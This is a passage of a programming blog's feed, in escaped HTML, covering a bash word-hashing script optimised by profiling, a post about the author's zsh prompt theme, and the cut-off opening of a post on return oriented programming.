&lt;span class="k"&gt;function&lt;/span&gt; kr1  &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;local&lt;/span&gt; &lt;span class="nv"&gt;word&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;
    &lt;span class="nv"&gt;HASH_RESULT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0&lt;span class="p"&gt;;&lt;/span&gt; i &amp;lt;&lt;span class="si"&gt;${#&lt;/span&gt;&lt;span class="nv"&gt;word&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; i++&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
        &lt;span class="nb"&gt;local&lt;/span&gt; &lt;span class="nv"&gt;letter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;word&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;((&lt;/span&gt; HASH_RESULT +&lt;span class="o"&gt;=&lt;/span&gt; letter_value&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$letter&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;))&lt;/span&gt;
    &lt;span class="k"&gt;done&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Full program source below&lt;sup id="fnref-1"&gt;&lt;a class="footnote-ref" href="#fn-1"&gt;1&lt;/a&gt;&lt;/sup&gt;. With the hash function implemented, it is fairly
straightforward to finish the rest of the program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; word&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    kr1 &lt;span class="nv"&gt;$word&lt;/span&gt;

    &lt;span class="o"&gt;((&lt;/span&gt; hash_to_count&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$HASH_RESULT&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;++ &lt;span class="o"&gt;))&lt;/span&gt;
    hash_to_words&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$HASH_RESULT&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;+&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &lt;/span&gt;&lt;span class="nv"&gt;$word&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt; hash_to_count&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$HASH_RESULT&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &amp;gt; max_count &lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
        &lt;span class="nv"&gt;max_count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;hash_to_count&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$HASH_RESULT&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
        &lt;span class="nv"&gt;max_hash&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$HASH_RESULT&lt;/span&gt;
    &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt; &amp;lt;word.lst
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;hash_to_words&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$max_hash&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At this point it became interesting. My &lt;code&gt;bash&lt;/code&gt; solution outperformed all the
other &lt;code&gt;bash&lt;/code&gt; solutions by a fair margin, but I wanted to see if I could do better.
I ran it under a profiler and saw that it was spending all its time in many
nested layers of &lt;code&gt;execute_command&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img alt="bash profiling run" src="https://codearcana.com/images/bash_perf_stack_trace.png" title="hash.bash has many nested calls to execute_command"&gt;&lt;/p&gt;
&lt;p&gt;This gave me the idea to try inlining the function call. Quickly prototyping a
variation using an inlined function call, I run some trials (and collect statistics
with my favorite tool, &lt;code&gt;histogram.py&lt;/code&gt;&lt;sup id="fnref-2"&gt;&lt;a class="footnote-ref" href="#fn-2"&gt;2&lt;/a&gt;&lt;/sup&gt;):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; variation in hash.bash hash.bash.inlined&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="nv"&gt;$variation&lt;/span&gt;
  &lt;span class="k"&gt;for&lt;/span&gt; trial in &lt;span class="o"&gt;{&lt;/span&gt;1..30&lt;span class="o"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="nv"&gt;start&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$EPOCHREALTIME&lt;/span&gt;
    bash &lt;span class="nv"&gt;$variation&lt;/span&gt; &amp;gt; /dev/null
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="k"&gt;$((&lt;/span&gt;EPOCHREALTIME &lt;span class="o"&gt;-&lt;/span&gt; start&lt;span class="k"&gt;))&lt;/span&gt;
  &lt;span class="k"&gt;done&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; histogram.py --confidence&lt;span class="o"&gt;=&lt;/span&gt;.90 &lt;span class="p"&gt;|&lt;/span&gt; head -n 2
  &lt;span class="nb"&gt;echo&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
hash.bash
&lt;span class="c1"&gt;# NumSamples = 30; Min = 3.43; Max = 3.99&lt;/span&gt;
&lt;span class="c1"&gt;# Mean = 3.529906 (+/- 0.028584); Variance = 0.009060; SD = 0.095184; Median 3.509426&lt;/span&gt;

hash.bash.inlined
&lt;span class="c1"&gt;# NumSamples = 30; Min = 2.84; Max = 3.16&lt;/span&gt;
&lt;span class="c1"&gt;# Mean = 2.932449 (+/- 0.016860); Variance = 0.003152; SD = 0.056141; Median 2.917874&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;As you can see, there is a greater than 15% improvement gain from inlining the
function! We take this approach further, removing the local variable &lt;code&gt;letter&lt;/code&gt; and
making our code compact:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0&lt;span class="p"&gt;;&lt;/span&gt; i &amp;lt;&lt;span class="si"&gt;${#&lt;/span&gt;&lt;span class="nv"&gt;word&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; i++&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="o"&gt;((&lt;/span&gt; HASH_RESULT +&lt;span class="o"&gt;=&lt;/span&gt; letter_value&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;word&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Running with this variation, we see yet another significant improvement:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;hash.bash.inline_nolocals
&lt;span class="c1"&gt;# NumSamples = 30; Min = 2.69; Max = 2.84&lt;/span&gt;
&lt;span class="c1"&gt;# Mean = 2.749286 (+/- 0.010406); Variance = 0.001201; SD = 0.034651; Median 2.746643&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;At this point we run again under a profiler and notice something interesting: the
first time the runtime of an &lt;code&gt;execute_command&lt;/code&gt; call isn't dominated by another
recursive call to &lt;code&gt;execute_command&lt;/code&gt;, the function &lt;code&gt;eval_arith_for_expr&lt;/code&gt; consumes
a large portion of the time.&lt;/p&gt;
&lt;p&gt;&lt;img alt="optimized bash perf" src="https://codearcana.com/images/bash_perf_eval_arith.png" title="eval_arith_for_expr is a serious part of this function's runtime"&gt;&lt;/p&gt;
&lt;p&gt;Furthermore, we see that a large portion of the rest of the time is eventually spent
in &lt;code&gt;expand_word_list_internal&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img alt="optimized bash perf" src="https://codearcana.com/images/bash_perf_expand_word.png" title="expand_word_list_internal is also a serious part of this function's runtime"&gt;&lt;/p&gt;
&lt;p&gt;These observations lead us to another technique - we will use only one character
variable names to try to optimize for these two functions. Running again with all of
these optimizations, we get a huge performance improvement:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;hash.bash.one_char_names
&lt;span class="c1"&gt;# NumSamples = 30; Min = 2.33; Max = 2.44&lt;/span&gt;
&lt;span class="c1"&gt;# Mean = 2.371499 (+/- 0.008031); Variance = 0.000715; SD = 0.026743; Median 2.363547&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can take this further, but I think I'm going to quit here for now - I improved
performance by almost 50% by using a profiler and some &lt;code&gt;bash&lt;/code&gt;-foo. Final program
below&lt;sup id="fnref-3"&gt;&lt;a class="footnote-ref" href="#fn-3"&gt;3&lt;/a&gt;&lt;/sup&gt;. One final note -
for the love of all that is holy, don't write performant programs in &lt;code&gt;bash&lt;/code&gt;! &lt;/p&gt;
&lt;div class="footnote"&gt;
&lt;hr&gt;
&lt;ol&gt;
&lt;li id="fn-1"&gt;
&lt;p&gt;Initial program.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/bin/env bash&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;BASH_VERSINFO&lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="o"&gt;]&lt;/span&gt; &amp;lt; 4&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Sorry, you need at least bash-4.0 to run this script.&amp;quot;&lt;/span&gt; &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;2
  &lt;span class="nb"&gt;exit&lt;/span&gt; 1
&lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="c1"&gt;# An associate array mapping each letter to its index.&lt;/span&gt;
&lt;span class="nb"&gt;declare&lt;/span&gt; -A letter_value
&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;97&lt;/span&gt;  &lt;span class="c1"&gt;# ascii &amp;#39;a&amp;#39;.&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; letter in a b c d e f g h i j k l m n o p q r s t u v w x y z&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  letter_value&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$letter&lt;/span&gt;&lt;span class="o"&gt;]=&lt;/span&gt;&lt;span class="k"&gt;$((&lt;/span&gt;i++&lt;span class="k"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;

&lt;span class="c1"&gt;# We will return into this variable.&lt;/span&gt;
&lt;span class="nb"&gt;declare&lt;/span&gt; -i HASH_RESULT
&lt;span class="k"&gt;function&lt;/span&gt; kr1  &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="nb"&gt;local&lt;/span&gt; &lt;span class="nv"&gt;word&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$1&lt;/span&gt;
    &lt;span class="nv"&gt;HASH_RESULT&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0&lt;span class="p"&gt;;&lt;/span&gt; i &amp;lt;&lt;span class="si"&gt;${#&lt;/span&gt;&lt;span class="nv"&gt;word&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; i++&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
        &lt;span class="nb"&gt;local&lt;/span&gt; &lt;span class="nv"&gt;letter&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;word&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
        &lt;span class="o"&gt;((&lt;/span&gt; HASH_RESULT +&lt;span class="o"&gt;=&lt;/span&gt; letter_value&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$letter&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;))&lt;/span&gt;
    &lt;span class="k"&gt;done&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;

&lt;span class="nb"&gt;declare&lt;/span&gt; -a hash_to_count
&lt;span class="nb"&gt;declare&lt;/span&gt; -a hash_to_words

&lt;span class="nb"&gt;declare&lt;/span&gt; -i &lt;span class="nv"&gt;max_count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0
&lt;span class="nb"&gt;declare&lt;/span&gt; -i &lt;span class="nv"&gt;max_hash&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;-1

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; word&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    kr1 &lt;span class="nv"&gt;$word&lt;/span&gt;

    &lt;span class="o"&gt;((&lt;/span&gt; hash_to_count&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$HASH_RESULT&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;++ &lt;span class="o"&gt;))&lt;/span&gt;
    hash_to_words&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$HASH_RESULT&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;+&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &lt;/span&gt;&lt;span class="nv"&gt;$word&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt; hash_to_count&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$HASH_RESULT&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &amp;gt; max_count &lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
        &lt;span class="nv"&gt;max_count&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;hash_to_count&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$HASH_RESULT&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
        &lt;span class="nv"&gt;max_hash&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$HASH_RESULT&lt;/span&gt;
    &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt; &amp;lt;word.lst

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;hash_to_words&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$max_hash&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a class="footnote-backref" href="#fnref-1" title="Jump back to footnote 1 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-2"&gt;
&lt;p&gt;Here I'm using a &lt;a href="https://github.com/awreece/data_hacks"&gt;modified version&lt;/a&gt;
  of &lt;code&gt;bitly/data_hacks&lt;/code&gt; that includes the flag &lt;code&gt;--confidence&lt;/code&gt; specifying a
     confidence interval around the mean to report.&amp;#160;&lt;a class="footnote-backref" href="#fnref-2" title="Jump back to footnote 2 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li id="fn-3"&gt;
&lt;p&gt;Final program.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/usr/local/bin/bash&lt;/span&gt;

&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt;BASH_VERSINFO&lt;span class="o"&gt;[&lt;/span&gt;0&lt;span class="o"&gt;]&lt;/span&gt; &amp;lt; 4&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
  &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Sorry, you need at least bash-4.0 to run this script.&amp;quot;&lt;/span&gt; &amp;gt;&lt;span class="p"&gt;&amp;amp;&lt;/span&gt;2
  &lt;span class="nb"&gt;exit&lt;/span&gt; 1
&lt;span class="k"&gt;fi&lt;/span&gt;

&lt;span class="c1"&gt;# An associate array mapping each letter to its index.&lt;/span&gt;
&lt;span class="nb"&gt;declare&lt;/span&gt; -A l
&lt;span class="nv"&gt;i&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;97&lt;/span&gt;  &lt;span class="c1"&gt;# ascii &amp;#39;a&amp;#39;.&lt;/span&gt;
&lt;span class="k"&gt;for&lt;/span&gt; letter in a b c d e f g h i j k l m n o p q r s t u v w x y z&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
  l&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$letter&lt;/span&gt;&lt;span class="o"&gt;]=&lt;/span&gt;&lt;span class="k"&gt;$((&lt;/span&gt;i++&lt;span class="k"&gt;))&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt;

&lt;span class="nb"&gt;declare&lt;/span&gt; -a c
&lt;span class="nb"&gt;declare&lt;/span&gt; -a v

&lt;span class="nb"&gt;declare&lt;/span&gt; -i &lt;span class="nv"&gt;m&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0
&lt;span class="nb"&gt;declare&lt;/span&gt; -i &lt;span class="nv"&gt;n&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;-1

&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="nb"&gt;read&lt;/span&gt; w&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
    &lt;span class="nv"&gt;h&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;0
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt; &lt;span class="nv"&gt;i&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; 0&lt;span class="p"&gt;;&lt;/span&gt; i &amp;lt;&lt;span class="si"&gt;${#&lt;/span&gt;&lt;span class="nv"&gt;w&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; i++&lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;do&lt;/span&gt;
        &lt;span class="o"&gt;((&lt;/span&gt; h +&lt;span class="o"&gt;=&lt;/span&gt; l&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;w&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;$i&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nv"&gt;1&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="o"&gt;))&lt;/span&gt;
    &lt;span class="k"&gt;done&lt;/span&gt;

    &lt;span class="o"&gt;((&lt;/span&gt; c&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$h&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;++ &lt;span class="o"&gt;))&lt;/span&gt;
    v&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$h&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;+&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; &lt;/span&gt;&lt;span class="nv"&gt;$w&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="o"&gt;((&lt;/span&gt; c&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$h&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &amp;gt; m &lt;span class="o"&gt;))&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; &lt;span class="k"&gt;then&lt;/span&gt;
        &lt;span class="nv"&gt;m&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;c&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$h&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
        &lt;span class="nv"&gt;n&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nv"&gt;$h&lt;/span&gt;
    &lt;span class="k"&gt;fi&lt;/span&gt;
&lt;span class="k"&gt;done&lt;/span&gt; &amp;lt;word.lst

&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="si"&gt;${&lt;/span&gt;&lt;span class="nv"&gt;v&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nv"&gt;$n&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;&lt;a class="footnote-backref" href="#fnref-3" title="Jump back to footnote 3 in the text"&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/div&gt;</content><category term="bash"></category><category term="profiling"></category></entry><entry><title>My zsh theme</title><link href="https://codearcana.com/posts/2013/06/11/my-zsh-theme.html" rel="alternate"></link><published>2013-06-11T00:00:00-07:00</published><updated>2013-06-11T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-06-11:/posts/2013/06/11/my-zsh-theme.html</id><summary type="html">&lt;p&gt;I spent some time this week switching from &lt;code&gt;bash&lt;/code&gt; to &lt;code&gt;zsh&lt;/code&gt; (I really enjoy
&lt;code&gt;zsh&lt;/code&gt; - I treat it as &lt;code&gt;bash&lt;/code&gt; with floating point arithmetic and other
niceities)
and making a theme for
&lt;a href="https://github.com/robbyrussell/oh-my-zsh"&gt;&lt;code&gt;oh-my-zsh&lt;/code&gt;&lt;/a&gt; and &lt;a href="https://github.com/sorin-ionescu/prezto"&gt;&lt;code&gt;prezto&lt;/code&gt;&lt;/a&gt;
for myself. I'm not quite done, but I am pretty pleased with
the results. &lt;/p&gt;
&lt;p&gt;It …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I spent some time this week switching from &lt;code&gt;bash&lt;/code&gt; to &lt;code&gt;zsh&lt;/code&gt; (I really enjoy
&lt;code&gt;zsh&lt;/code&gt; - I treat it as &lt;code&gt;bash&lt;/code&gt; with floating point arithmetic and other
niceities)
and making a theme for
&lt;a href="https://github.com/robbyrussell/oh-my-zsh"&gt;&lt;code&gt;oh-my-zsh&lt;/code&gt;&lt;/a&gt; and &lt;a href="https://github.com/sorin-ionescu/prezto"&gt;&lt;code&gt;prezto&lt;/code&gt;&lt;/a&gt;
for myself. I'm not quite done, but I am pretty pleased with
the results. &lt;/p&gt;
&lt;p&gt;It differs from most themes in the following ways:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Explicitly not having git or other version control info in the prompt (I very rarely don't know what branch I am in and when I care about the status of git, I usually care about which files are affected).&lt;/li&gt;
&lt;li&gt;Showing the execution time and status of the last command executed.&lt;/li&gt;
&lt;li&gt;Displaying a notification (on Mac OSX) if a (long running) command completes and the terminal isn't in the foreground.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;First, a screenshot:&lt;/p&gt;
&lt;p&gt;&lt;img alt="zsh theme" src="https://codearcana.com/images/zsh_theme.png" title="My zsh theme"&gt;
&lt;img alt="zsh theme popup" src="https://codearcana.com/images/zsh_theme_popup.png" title="A sample notification - click to focus on the terminal window."&gt;&lt;/p&gt;
&lt;p&gt;And some more detailed explanation:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;By default, the prompt is very minimalist (the current directory and a % or a # depending on the privileges of the shell). Most extra information is hidden unless it is useful.&lt;/li&gt;
&lt;li&gt;In the right hand prompt, the execution time of the last command is displayed. It is colored green if the command returned successfully and red otherwise.&lt;/li&gt;
&lt;li&gt;The number of background processes is displayed (but only if there are background processes).&lt;/li&gt;
&lt;li&gt;If the path to the current directory is long, it is also displayed in the right hand side.&lt;/li&gt;
&lt;li&gt;The user and hostname are displayed (only) if logged in over &lt;code&gt;ssh&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Since this is &lt;code&gt;zsh&lt;/code&gt;, the right hand prompt disappears if the line is long enough.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Source is in &lt;a href="https://github.com/awreece/oh-my-zsh/blob/master/themes/awreece.zsh-theme"&gt;my fork of &lt;code&gt;oh-my-zsh&lt;/code&gt;&lt;/a&gt; and &lt;a href="https://github.com/awreece/prezto/blob/theme/modules/prompt/functions/prompt_awreece_setup"&gt;my fork of &lt;code&gt;prezto&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;</content><category term="zsh"></category></entry><entry><title>Introduction to return oriented programming (ROP)</title><link href="https://codearcana.com/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html" rel="alternate"></link><published>2013-05-28T00:00:00-07:00</published><updated>2013-05-28T00:00:00-07:00</updated><author><name>Alex Reece</name></author><id>tag:codearcana.com,2013-05-28:/posts/2013/05/28/introduction-to-return-oriented-programming-rop.html</id><summary type="html">&lt;p&gt;A brief introduction to Return Oriented Programming (ROP) exploits.&lt;/p&gt;</summary><content type="html">&lt;h1&gt;What is ROP?&lt;/h1&gt;
